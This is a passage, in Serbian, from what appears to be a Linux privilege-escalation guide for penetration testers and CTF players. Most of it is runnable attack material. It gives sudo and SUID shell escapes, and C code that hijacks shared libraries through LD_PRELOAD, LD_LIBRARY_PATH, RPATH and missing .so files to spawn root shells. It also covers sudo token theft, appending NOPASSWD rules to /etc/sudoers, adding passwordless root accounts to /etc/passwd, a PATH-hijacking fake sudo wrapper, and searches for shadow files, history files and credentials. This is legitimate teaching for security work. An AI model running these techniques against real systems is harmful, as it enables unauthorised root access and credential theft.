echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate neku lozinku** okruženja **pokušajte da se prijavite kao svaki korisnik** koristeći lozinku.

### Su Brute

Ako vam nije stalo do pravljenja puno buke i `su` i `timeout` binarni fajlovi su prisutni na računaru, možete pokušati da brute-force-ujete korisnika koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa `-a` parametrom takođe pokušava da brute-force-uje korisnike.

## Zloupotrebe Writable PATH-a

### $PATH

Ako otkrijete da možete **pisati unutar neke fascikle $PATH-a** možda ćete moći da eskalirate privilegije tako što ćete **napraviti backdoor unutar pisive fascikle** sa imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **nije učitana iz fascikle koja se nalazi pre** vaše pisive fascikle u $PATH-u.

### SUDO i SUID

Možda će vam biti dozvoljeno da izvršite neku komandu koristeći sudo ili bi mogli imati suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neki **neočekivani komandi omogućavaju vam da čitate i/ili pišete datoteke ili čak izvršite komandu.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može omogućiti korisniku da izvrši neku komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`, sada je trivijalno dobiti shell dodavanjem ssh ključa u root direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **postavi promenljivu okruženja** dok izvršava nešto:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB mašini Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** kako bi učitao proizvoljnu python biblioteku dok izvršava skriptu kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo izvršavanje zaobilaženje putanja

**Skočite** da pročitate druge datoteke ili koristite **simboličke linkove**. Na primer, u sudoers datoteci: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), još je lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komanda/SUID binarni bez putanje komande

Ako je **sudo dozvola** data jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti promenom PATH varijable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binarni **izvršava drugu komandu bez navođenja putanje do nje (uvek proverite sa** _**strings**_ **sadržaj čudnog SUID binarnog fajla)**.

[Primeri payload-a za izvršavanje.](payloads-to-execute.md)

### SUID binarni sa putanjom komande

Ako **suid** binarni **izvršava drugu komandu navođenjem putanje**, onda možete pokušati da **izvezete funkciju** nazvanu kao komanda koju suid fajl poziva.

Na primer, ako suid binarni poziva _**/usr/sbin/service apache2 start**_ morate pokušati da kreirate funkciju i izvezete je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binarni fajl, ova funkcija će biti izvršena

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** promenljiva okruženja se koristi za određivanje jedne ili više deljenih biblioteka (.so fajlova) koje će loader učitati pre svih drugih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces je poznat kao preloading biblioteke.

Međutim, da bi se održala sigurnost sistema i sprečilo korišćenje ove funkcije, posebno sa **suid/sgid** izvršnim fajlovima, sistem nameće određene uslove:

- Loader zanemaruje **LD_PRELOAD** za izvršne fajlove gde se stvarni korisnički ID (_ruid_) ne poklapa sa efektivnim korisničkim ID (_euid_).
- Za izvršne fajlove sa suid/sgid, samo biblioteke u standardnim putanjama koje su takođe suid/sgid se pre-loaduju.

Povećanje privilegija može se dogoditi ako imate mogućnost izvršavanja komandi sa `sudo` i izlaz `sudo -l` uključuje izjavu **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da **LD_PRELOAD** promenljiva okruženja opstane i bude prepoznata čak i kada se komande izvršavaju sa `sudo`, potencijalno dovodeći do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvaj kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **kompajlirajte to** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Konačno, **povećajte privilegije** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može biti zloupotrebljen ako napadač kontroliše **LD_LIBRARY_PATH** env varijablu jer kontroliše putanju gde će se tražiti biblioteke.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID binarni – .so injekcija

Kada naiđete na binarni fajl sa **SUID** dozvolama koji deluje neobično, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. Ovo se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, susret sa greškom poput _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (Nema takve datoteke ili direktorijuma)"_ sugeriše potencijal za eksploataciju.

Da bi se to iskoristilo, trebalo bi da se napravi C datoteka, recimo _"/path/to/.config/libcalc.c"_, koja sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, kada se kompajlira i izvrši, ima za cilj da poveća privilegije manipulisanjem dozvolama datoteka i izvršavanjem shel-a sa povišenim privilegijama.

Kompajlirajte gornji C fajl u deljeni objekat (.so) fajl sa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Konačno, pokretanje pogođenog SUID binarnog fajla trebalo bi da aktivira eksploataciju, omogućavajući potencijalni kompromitovanje sistema.

## Preuzimanje deljenih objekata
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binarni fajl koji učitava biblioteku iz fascikle u kojoj možemo pisati, hajde da kreiramo biblioteku u toj fascikli sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali treba da ima funkciju pod nazivom `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih datoteka koje napadač može iskoristiti da zaobiđe lokalna sigurnosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto to, ali za slučajeve kada možete **samo da injektujete argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih datoteka koje se mogu zloupotrebiti za izlazak iz ograničenih ljuski, eskalaciju ili održavanje povišenih privilegija, prenos datoteka, pokretanje bind i reverse ljuski, i olakšavanje drugih post-exploitation zadataka.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Ako možete pristupiti `sudo -l`, možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li može da pronađe način da iskoristi bilo koje sudo pravilo.

### Ponovno korišćenje Sudo Tokena

U slučajevima kada imate **sudo pristup** ali ne i lozinku, možete eskalirati privilegije tako što ćete **čekati na izvršenje sudo komande i zatim preuzeti sesijski token**.

Zahtevi za eskalaciju privilegija:

- Već imate ljusku kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15 minuta** (po defaultu, to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga učitati)

(Možete privremeno omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno modifikovanjem `/etc/sysctl.d/10-ptrace.conf` i postavljanjem `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi zahtevi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Prvi exploit** (`exploit.sh`) će kreirati binarnu datoteku `activate_sudo_token` u _/tmp_. Možete je koristiti da **aktivirate sudo token u vašoj sesiji** (nećete automatski dobiti root ljusku, uradite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **eksploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **u vlasništvu root-a sa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Treći exploit (`exploit_v3.sh`) će **napraviti sudoers datoteku** koja čini **sudo tokene večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **dozvole za pisanje** u folderu ili na bilo kojoj od kreiranih datoteka unutar foldera, možete koristiti binarni [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
Na primer, ako možete da prepišete datoteku _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku tako što ćete:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Datoteka `/etc/sudoers` i datoteke unutar `/etc/sudoers.d` konfigurišu ko može koristiti `sudo` i kako. Ove datoteke **po defaultu mogu da se čitaju samo od strane korisnika root i grupe root**.\
**Ako** možete **čitati** ovu datoteku, mogli biste da **dobijete neke zanimljive informacije**, a ako možete **pisati** bilo koju datoteku, moći ćete da **escalirate privilegije**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možete pisati, možete zloupotrebiti ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način da se zloupotrebe ove dozvole:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative za `sudo` binarni fajl kao što je `doas` za OpenBSD, zapamtite da proverite njegovu konfiguraciju na `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** za eskalaciju privilegija i dobili ste shell unutar tog korisničkog konteksta, možete **napraviti novi sudo izvršni fajl** koji će izvršiti vaš kod kao root, a zatim korisnikovu komandu. Zatim, **modifikujte $PATH** korisničkog konteksta (na primer dodajući novi put u .bash_profile) tako da kada korisnik izvrši sudo, vaš sudo izvršni fajl bude izvršen.

Imajte na umu da ako korisnik koristi drugačiji shell (ne bash) bićete u obavezi da modifikujete druge fajlove kako biste dodali novi put. Na primer, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Možete pronaći još jedan primer u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečega poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Datoteka `/etc/ld.so.conf` označava **odakle su učitane konfiguracione datoteke**. Obično, ova datoteka sadrži sledeći put: `include /etc/ld.so.conf.d/*.conf`

To znači da će se konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf` čitati. Ove konfiguracione datoteke **pokazuju na druge foldere** gde će se **biblioteke** **tražiti**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima dozvole za pisanje** na bilo kojem od putanja navedenih: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo koja datoteka unutar `/etc/ld.so.conf.d/` ili bilo koji folder unutar konfiguracione datoteke unutar `/etc/ld.so.conf.d/*.conf`, može biti u mogućnosti da eskalira privilegije.\
Pogledajte **kako iskoristiti ovu pogrešnu konfiguraciju** na sledećoj stranici:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib u `/var/tmp/flag15/` biće korišćen od strane programa na ovom mestu kao što je navedeno u `RPATH` varijabli.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlu biblioteku u `/var/tmp` sa `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Mogućnosti

Linux mogućnosti pružaju **podskup dostupnih root privilegija procesu**. Ovo efikasno deli root **privilegije na manje i prepoznatljive jedinice**. Svaka od ovih jedinica može se nezavisno dodeliti procesima. Na ovaj način, kompletan skup privilegija se smanjuje, smanjujući rizike od eksploatacije.\
Pročitajte sledeću stranicu da **saznate više o mogućnostima i kako ih zloupotrebiti**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit za "izvršavanje"** implicira da korisnik može da "**cd**" u folder.\
**"Read"** bit implicira da korisnik može **da nabroji** **fajlove**, a **"write"** bit implicira da korisnik može **da obriše** i **kreira** nove **fajlove**.

## ACLs

Liste kontrole pristupa (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposobnih da **prevaziđu tradicionalne ugo/rwx dozvole**. Ove dozvole poboljšavaju kontrolu nad pristupom fajlovima ili direktorijumima omogućavajući ili odbijajući prava određenim korisnicima koji nisu vlasnici ili deo grupe. Ovaj nivo **granularnosti osigurava preciznije upravljanje pristupom**. Dodatne informacije možete pronaći [**ovde**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dajte** korisniku "kali" dozvole za čitanje i pisanje nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Preuzmite** datoteke sa specifičnim ACL-ovima sa sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sesije

U **starim verzijama** možete **preuzeti** neku **shell** sesiju drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da **se povežete** samo na screen sesije **svojeg korisnika**. Međutim, mogli biste pronaći **zanimljive informacije unutar sesije**.

### preuzimanje screen sesija

**Lista screen sesija**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Priključite se sesiji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sesije preuzimanje

Ovo je bio problem sa **starim tmux verzijama**. Nisam mogao da preuzmem tmux (v2.1) sesiju koju je kreirao root kao korisnik bez privilegija.

**Lista tmux sesija**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Priključite se sesiji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Proverite **Valentine box from HTB** za primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Sve SSL i SSH ključevi generisani na Debian baziranim sistemima (Ubuntu, Kubuntu, itd) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim bugom.\
Ovaj bug se javlja prilikom kreiranja novog ssh ključa u tim OS, jer **je bilo moguće samo 32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i **imajući ssh javni ključ možete tražiti odgovarajući privatni ključ**. Izračunate mogućnosti možete pronaći ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Zanimljive konfiguracione vrednosti

- **PasswordAuthentication:** Određuje da li je autentifikacija lozinkom dozvoljena. Podrazumevano je `no`.
- **PubkeyAuthentication:** Određuje da li je autentifikacija javnim ključem dozvoljena. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je autentifikacija lozinkom dozvoljena, određuje da li server dozvoljava prijavu na naloge sa praznim lozinkama. Podrazumevano je `no`.

### PermitRootLogin

Određuje da li root može da se prijavi koristeći ssh, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root može da se prijavi koristeći lozinku i privatni ključ
- `without-password` ili `prohibit-password`: root se može prijaviti samo sa privatnim ključem
- `forced-commands-only`: Root se može prijaviti samo koristeći privatni ključ i ako su opcije komandi specificirane
- `no` : ne

### AuthorizedKeysFile

Određuje datoteke koje sadrže javne ključeve koji se mogu koristiti za autentifikaciju korisnika. Može sadržati tokene kao što su `%h`, koji će biti zamenjeni sa kućnim direktorijumom. **Možete navesti apsolutne putanje** (počinjući od `/`) ili **relativne putanje od korisničkog doma**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će ukazati da ako pokušate da se prijavite sa **privatnim** ključem korisnika "**testusername**", ssh će uporediti javni ključ vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **koristite svoje lokalne SSH ključeve umesto da ostavljate ključeve** (bez lozinki!) na vašem serveru. Tako ćete moći da **skočite** putem ssh **na host** i odatle **skočite na drugi** host **koristeći** **ključ** koji se nalazi na vašem **početnom hostu**.

Morate postaviti ovu opciju u `$HOME/.ssh.config` ovako:
```
Host example.com
ForwardAgent yes
```
Napomena da ako je `Host` `*`, svaki put kada korisnik pređe na drugu mašinu, ta mašina će moći da pristupi ključevima (što je bezbednosni problem).

Datoteka `/etc/ssh_config` može **prepisati** ove **opcije** i dozvoliti ili odbiti ovu konfiguraciju.\
Datoteka `/etc/sshd_config` može **dozvoliti** ili **odbiti** prosleđivanje ssh-agenta sa ključnom rečju `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisan u okruženju, pročitajte sledeću stranicu jer **možda možete da ga zloupotrebite za eskalaciju privilegija**:

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljive datoteke

### Datoteke profila

Datoteka `/etc/profile` i datoteke pod `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novu ljusku**. Stoga, ako možete **da pišete ili modifikujete bilo koju od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe bilo koji čudan profil skript, trebali biste ga proveriti na **osetljive detalje**.

### Passwd/Shadow Fajlovi

U zavisnosti od operativnog sistema, fajlovi `/etc/passwd` i `/etc/shadow` mogu imati drugačije ime ili može postojati backup. Stoga se preporučuje da **pronađete sve njih** i **proverite da li možete da ih pročitate** da vidite **da li postoje heševi** unutar fajlova:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
U nekim slučajevima možete pronaći **hash-ove lozinki** unutar datoteke `/etc/passwd` (ili ekvivalentne).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Prvo, generišite lozinku sa jednom od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i dodajte generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti `su` komandu sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPWARNING: možete pogoršati trenutnu sigurnost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama, `/etc/passwd` se nalazi na `/etc/pwd.db` i `/etc/master.passwd`, takođe je `/etc/shadow` preimenovan u `/etc/spwd.db`.

Trebalo bi da proverite da li možete **da pišete u neke osetljive fajlove**. Na primer, da li možete da pišete u neki **fajl za konfiguraciju servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete **modifikovati konfiguracioni fajl Tomcat servisa unutar /etc/systemd/,** tada možete modifikovati linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaša backdoor će biti izvršena sledeći put kada se tomcat pokrene.

### Proverite foldere

Sledeći folderi mogu sadržati backup-e ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Čudne lokacije/Posedovani fajlovi
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjeni fajlovi u poslednjim minutima
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB datoteke
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_istorija, .sudo_as_admin_successful, profil, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml datoteke
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Sakriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binari u PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web datoteke**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Bekap**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), pretražuje **several possible files that could contain passwords**.\
**Još jedan zanimljiv alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koji je aplikacija otvorenog koda korišćena za preuzimanje velikog broja lozinki sa lokalnog računara za Windows, Linux i Mac.

### Logovi

Ako možete da čitate logove, možda ćete moći da pronađete **interesting/confidential information inside them**. Što je log čudniji, to će biti zanimljiviji (verovatno).\
Takođe, neki "**bad**" konfigurirani (backdoored?) **audit logs** mogu vam omogućiti da **record passwords** unutar audit logova kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste **pročitali logove, grupa** [**adm**](interesting-groups-linux-pe/#adm-group) će biti veoma korisna.

### Shell datoteke
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Trebalo bi da proverite datoteke koje sadrže reč "**password**" u svom **imenu** ili unutar **sadržaja**, kao i da proverite IP adrese i emailove unutar logova, ili regexove za hashove.\
Neću ovde nabrajati kako da uradite sve ovo, ali ako ste zainteresovani, možete proveriti poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) vrši.

## Writable files

### Python library hijacking

